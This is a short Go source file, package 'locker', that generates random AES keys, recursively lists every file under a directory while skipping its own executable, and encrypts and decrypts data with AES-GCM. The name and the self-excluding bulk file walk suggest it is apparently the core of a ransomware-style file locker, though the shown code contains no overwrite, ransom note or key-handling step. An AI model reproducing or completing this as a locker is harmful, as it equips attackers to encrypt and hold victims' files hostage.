package locker

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// KeyGen function generates random 32 byte
// key for each file that is encrypted/decrypted
func KeyGen() []byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println(err)
	}
	return key
}

// Walker function is used to enumerate each file in each
// directory recurively.
func Walker(files *[]string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println(err)
		}
		if info.IsDir() {
			return nil
		}
		exe, err := os.Executable()
		if err != nil {
			panic(err)
		}
		if path == exe {
			return nil
		}
		*files = append(*files, path)
		return nil
	}
}

// Encrypt func encrypts files using our random key and file.
// the result will be an AES cipher block
func Encrypt(cleartext []byte, key []byte) (*[]byte, error) {
	cipherBlock, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Galois Counter Mode being applied to AES cipher block.
	// GCM also adds authentication to ensure encrypted data
	//  is not tampered with.
	gcm, err := cipher.NewGCM(cipherBlock)
	if err != nil {
		return nil, err
	}

	// Initilization of the of number once used. Though,
	// I am using rand.Read the nonce does not need to be random
	// if it is random there is a chance it can be reused, but each
	// key will be random.
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Adding the nonce to the cipher text. The same nonce
	// will be needed for decryption. Encrypted data will
	// be added to the nonce.
	cipherText := gcm.Seal(nonce, nonce, cleartext, nil)
	return &cipherText, nil

}

// Decrypt function, parses nonce from cipher text and converts
// encrypted text back to plain text.
func Decrypt(cipherText, key []byte) ([]byte, error) {
	cipherBlock, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(cipherBlock)
	if err != nil {
		return nil, err
	}

	return gcm.Open(nil, cipherText[:gcm.NonceSize()], cipherText[gcm.NonceSize():], nil)
}
